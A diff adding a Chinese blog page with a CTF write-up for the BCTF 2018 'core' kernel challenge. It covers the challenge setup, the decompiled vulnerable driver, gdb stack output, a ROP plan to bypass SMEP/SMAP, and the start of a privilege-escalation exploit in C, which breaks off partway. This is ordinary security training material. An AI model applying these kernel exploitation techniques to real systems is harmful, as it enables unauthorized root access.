@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,kernel,ctf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目文件 1234总用量 11M-rwxrwxrwx 1 greydog users 2.4M Apr  6 11:07 1.cpio-rwxrwxrwx 1 greydog users 7.9M Apr  3 09:00 bzImage-rwxrwxrwx 1 greydog users  309 Apr  4 07:04 start.sh  查看start.sh 1234567891011#">
+<meta name="keywords" content="pwn,kernel,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bctf2018-core">
+<meta property="og:url" content="http://yoursite.com/2018/08/01/bctf2018-core/index.html">
+<meta property="og:site_name" content="greyd0g&#39; blog">
+<meta property="og:description" content="题目文件 1234总用量 11M-rwxrwxrwx 1 greydog users 2.4M Apr  6 11:07 1.cpio-rwxrwxrwx 1 greydog users 7.9M Apr  3 09:00 bzImage-rwxrwxrwx 1 greydog users  309 Apr  4 07:04 start.sh  查看start.sh 1234567891011#">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-08-01T03:51:11.480Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bctf2018-core">
+<meta name="twitter:description" content="题目文件 1234总用量 11M-rwxrwxrwx 1 greydog users 2.4M Apr  6 11:07 1.cpio-rwxrwxrwx 1 greydog users 7.9M Apr  3 09:00 bzImage-rwxrwxrwx 1 greydog users  309 Apr  4 07:04 start.sh  查看start.sh 1234567891011#">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/01/bctf2018-core/"/>
+
+
+
+
+
+  <title>bctf2018-core | greyd0g' blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">greyd0g' blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">good good study</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友情链接
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/01/bctf2018-core/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="greyd0g">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="greyd0g' blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">bctf2018-core</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-01T11:48:48+08:00">
+                2018-08-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/08/01/bctf2018-core/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2018/08/01/bctf2018-core/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li><p>题目文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">总用量 11M</span><br><span class="line">-rwxrwxrwx 1 greydog users 2.4M Apr  6 11:07 1.cpio</span><br><span class="line">-rwxrwxrwx 1 greydog users 7.9M Apr  3 09:00 bzImage</span><br><span class="line">-rwxrwxrwx 1 greydog users  309 Apr  4 07:04 start.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看start.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">GDB_PORT=1234</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./1.cpio \</span><br><span class="line">-append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic quiet nokaslr"</span> \<span class="comment">#关闭了kaslr 地址固定</span></span><br><span class="line">-cpu qemu64,+smep,+smap \<span class="comment">#开启了smep和smap 需要设置cr4 bypass</span></span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-gdb tcp::<span class="variable">$&#123;GDB_PORT&#125;</span> \</span><br><span class="line">-monitor /dev/null -nographic 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>解压bzImage得到vmlinux</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ od -h -A d bzImage | grep --color -m 3 -A 1 -i 8b1f#寻找gzip标志</span><br><span class="line">0016496 2860 007c e0ff 8b1f 0008 0000 0000 0302</span><br><span class="line">0016512 fdec 7c7b e514 f8dd efff 5926 1008 889c</span><br><span class="line">--</span><br><span class="line">0088448 c827 7719 8b1f b2ce b7ae acb6 780d 39f3</span><br><span class="line">0088464 f465 382a fa58 de1a 065e af27 e5dc f843</span><br><span class="line">--</span><br><span class="line">0098464 8b1f de61 f7f1 ed6b 1e79 b33e 4f48 a396</span><br><span class="line">0098480 b7ec 4b7a 77e7 8af8 e123 2805 596f e304</span><br><span class="line"></span><br><span class="line">dd if=BZIMAGE.INS bs=1 skip=16502 | gunzip &gt; vmlinux.bin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解压cpio文件，得到驱动文件,查看init</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /fairshare.ko</span><br><span class="line">chmod 666 /dev/fairshare</span><br><span class="line"></span><br><span class="line">poweroff -d 180 -f &amp;</span><br><span class="line"><span class="comment">#setsid /bin/cttyhack setuidgid 1000 /bin/sh#注释掉普通用户</span></span><br><span class="line">/bin/sh<span class="comment">#用root用户方便调试</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>ida打开驱动文件</p>
+<ul>
+<li>ioctl函数，有锁，只有一个do_sport,do_sport后就是bug()，所以进入do_sport函数必须劫持rip</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_int64 __<span class="function">fastcall <span class="title">device_ioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  v3 = arg;</span><br><span class="line">  mutex_lock(&amp;ts_mutex);</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x539</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    do_sport(v3);</span><br><span class="line">    BUG();</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_unlock(&amp;ts_mutex);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>查看do_sport函数，从用户态拷贝数据，设置栈上某写位置为0x9210，能够劫持rip。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">do_sport</span><span class="params">(<span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  control_flow_hijack_primitive cfh; <span class="comment">// [rsp+10h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+A0h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  copy_from_user(&amp;cfh, arg, <span class="number">0x90</span>LL);</span><br><span class="line">  cfh.rax = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.rbx = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.rcx = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.rdx = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.rsi = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.r8 = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.r9 = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.r10 = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.r11 = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.r12 = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.r13 = <span class="number">0x9210</span>LL;</span><br><span class="line">  cfh.r14 = <span class="number">0x9210</span>LL;</span><br><span class="line">  JUMPOUT(__CS__, cfh.rip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>漏洞利用</p>
+<ul>
+<li><p>编写poc查看栈分布情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">gdb vmlinux.bin</span><br><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">fairshare 16384 0 - Live 0xffffffffc0000000 (O)</span><br><span class="line">gdb-peda$ add-symbol-file fairshare.ko  0xffffffffc0000000</span><br><span class="line">add symbol table from file <span class="string">"fairshare.ko"</span> at</span><br><span class="line">	.text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from fairshare.ko...done.</span><br><span class="line">gdb-peda$ define hook-stop</span><br><span class="line">Type commands <span class="keyword">for</span> definition of <span class="string">"hook-stop"</span>.</span><br><span class="line">End with a line saying just <span class="string">"end"</span>.</span><br><span class="line">&gt;info registers </span><br><span class="line">&gt;x /10i <span class="variable">$rip</span></span><br><span class="line">&gt;x /10gx <span class="variable">$rsp</span></span><br><span class="line">&gt;end</span><br><span class="line">gdb-peda$ <span class="built_in">break</span> do_sport</span><br><span class="line">gdb-peda$ target remote localhost:1234</span><br><span class="line"><span class="comment">#运行poc后断在do—sport返回</span></span><br><span class="line">rax            0xacacacacacacacac	0xacacacacacacacac</span><br><span class="line">rbx            0x539	0x539</span><br><span class="line">rcx            0x0	0x0</span><br><span class="line">rdx            0x0	0x0</span><br><span class="line">rsi            0x7ffcac68d510	0x7ffcac68d510</span><br><span class="line">rdi            0xabababababababab	0xabababababababab<span class="comment">#第一个参数可控</span></span><br><span class="line">rbp            0x7ffcac68d480	0x7ffcac68d480</span><br><span class="line">rsp            0xffffc9000011fdc0	0xffffc9000011fdc0</span><br><span class="line">r8             0xabababababababab	0xabababababababab</span><br><span class="line">r9             0x1313131313131313	0x1313131313131313</span><br><span class="line">r10            0x1414141414141414	0x1414141414141414</span><br><span class="line">r11            0x1515151515151515	0x1515151515151515</span><br><span class="line">r12            0x7ffcac68d480	0x7ffcac68d480</span><br><span class="line">r13            0x539	0x539</span><br><span class="line">r14            0x7ffcac68d480	0x7ffcac68d480</span><br><span class="line">r15            0x0	0x0</span><br><span class="line">rip            0xffffffffc0000235	0xffffffffc0000235 &lt;do_sport+181&gt;</span><br><span class="line">eflags         0x246	[ PF ZF IF ]</span><br><span class="line">cs             0x10	0x10</span><br><span class="line">ss             0x18	0x18</span><br><span class="line">ds             0x0	0x0</span><br><span class="line">es             0x0	0x0</span><br><span class="line">fs             0x0	0x0</span><br><span class="line">gs             0x0	0x0</span><br><span class="line">=&gt; 0xffffffffc0000235 &lt;do_sport+181&gt;:	push   QWORD PTR [rsp+0x8]</span><br><span class="line">   0xffffffffc0000239 &lt;do_sport+185&gt;:	ret    </span><br><span class="line">   0xffffffffc000023a &lt;do_sport+186&gt;:	mov    rcx,QWORD PTR [rsp+0xa0]</span><br><span class="line">   0xffffffffc0000242 &lt;do_sport+194&gt;:	xor    rcx,QWORD PTR gs:0x28</span><br><span class="line">   0xffffffffc000024b &lt;do_sport+203&gt;:	jne    0xffffffffc000025a &lt;do_sport+218&gt;</span><br><span class="line">   0xffffffffc000024d &lt;do_sport+205&gt;:	mov    eax,0xfffffff3</span><br><span class="line">   0xffffffffc0000252 &lt;do_sport+210&gt;:	add    rsp,0xa8</span><br><span class="line">   0xffffffffc0000259 &lt;do_sport+217&gt;:	ret    </span><br><span class="line">   0xffffffffc000025a &lt;do_sport+218&gt;:	call   0xffffffff8105a4b0</span><br><span class="line">   0xffffffffc000025f:	nop</span><br><span class="line">0xffffc9000011fdc0:	0xabababababababab	0xacacacacacacacac<span class="comment">#rip可控</span></span><br><span class="line">0xffffc9000011fdd0:	0x0000000000009210	0x0000000000009210</span><br><span class="line">0xffffc9000011fde0:	0x0000000000009210	0x0000000000009210</span><br><span class="line">0xffffc9000011fdf0:	0x0000000000009210	0xabababababababab<span class="comment">#连续可控区域</span></span><br><span class="line">0xffffc9000011fe00:	0xaeaeaeaeaeaeaeae	0xafafafafafafafaf</span><br><span class="line">0xffffc9000011fe10:	0x0000000000009210	0x0000000000009210</span><br><span class="line">0xffffc9000011fe20:	0x0000000000009210	0x0000000000009210</span><br><span class="line">0xffffc9000011fe30:	0x0000000000009210	0x0000000000009210</span><br><span class="line">0xffffc9000011fe40:	0x0000000000009210	0x1515151515151515</span><br></pre></td></tr></table></figure>
+<ul>
+<li>构造rop链<ul>
+<li>bypass smep &amp;smap</li>
+<li>stack migration 跳到用户态空间继续执行提权rop</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>完整exp(很奇怪 前半夜跳到prepare_kernel_cred一直出错 下半夜就好了 )</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> do_sport  0x539</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs ,user_ss,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %%cs, %0\n"</span> <span class="comment">// mov rcx, cs</span></span><br><span class="line">        <span class="string">"movq %%ss, %1\n"</span> <span class="comment">// mov rdx, ss</span></span><br><span class="line">        <span class="string">"pushfq\n"</span>        <span class="comment">// 把rflags的值压栈</span></span><br><span class="line">        <span class="string">"popq %2\n"</span>       <span class="comment">// pop rax</span></span><br><span class="line">        :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_rflags) : : <span class="string">"memory"</span> <span class="comment">// mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"user_cs = %lx, user_ss = %lx, user_rflags = %lx\n"</span>,</span><br><span class="line">           user_cs,</span><br><span class="line">           user_ss,</span><br><span class="line">           user_rflags </span><br><span class="line">           );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">control_flow_hijack_primitive</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rax;</span><br><span class="line">    <span class="keyword">uint64_t</span> rbx;</span><br><span class="line">    <span class="keyword">uint64_t</span> rcx;</span><br><span class="line">    <span class="keyword">uint64_t</span> rdx;</span><br><span class="line">    <span class="keyword">uint64_t</span> rsi;</span><br><span class="line">    <span class="keyword">uint64_t</span> rdi;</span><br><span class="line">    <span class="keyword">uint64_t</span> rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> rbp;</span><br><span class="line">    <span class="keyword">uint64_t</span> r8;</span><br><span class="line">    <span class="keyword">uint64_t</span> r9;</span><br><span class="line">    <span class="keyword">uint64_t</span> r10;</span><br><span class="line">    <span class="keyword">uint64_t</span> r11;</span><br><span class="line">    <span class="keyword">uint64_t</span> r12;</span><br><span class="line">    <span class="keyword">uint64_t</span> r13;</span><br><span class="line">    <span class="keyword">uint64_t</span> r14;</span><br><span class="line">    <span class="keyword">uint64_t</span> r15;</span><br><span class="line">    <span class="keyword">uint64_t</span> rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> reset_all;</span><br><span class="line">&#125;control_flow_hijack_primitive;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_memory</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> mmap_start , mmap_size;</span><br><span class="line">    mmap_start = <span class="number">0x1000</span>;</span><br><span class="line">    mmap_size = <span class="number">0x20000</span>;</span><br><span class="line">    <span class="keyword">if</span>( mmap( (<span class="keyword">void</span>*)mmap_start,</span><br><span class="line">              mmap_size,</span><br><span class="line">              PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">              MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,</span><br><span class="line">              <span class="number">-1</span>,</span><br><span class="line">              <span class="number">0</span>) == MAP_FAILED</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"mmap fault\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mprotect(mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">    